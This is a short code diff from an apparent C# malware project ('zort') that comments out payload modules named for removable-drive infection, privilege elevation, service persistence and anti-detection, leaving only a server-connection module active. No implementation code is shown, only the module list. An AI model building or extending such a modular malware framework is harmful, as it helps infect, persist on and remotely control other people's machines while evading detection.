@@ -9,11 +9,11 @@ namespace zort
     {
         List<IPayloadModule> modules = new List<IPayloadModule>
                 {
-                    new RemovableInfector(),
-                    new ElevationHelper(),
-                    new ServiceManager(),
+                    //new RemovableInfector(),
+                    //new ElevationHelper(),
+                    //new ServiceManager(),
                     new ServerCon(),
-                    new AntiDetection(),
+                    //new AntiDetection(),
                 };
 
         public Program()
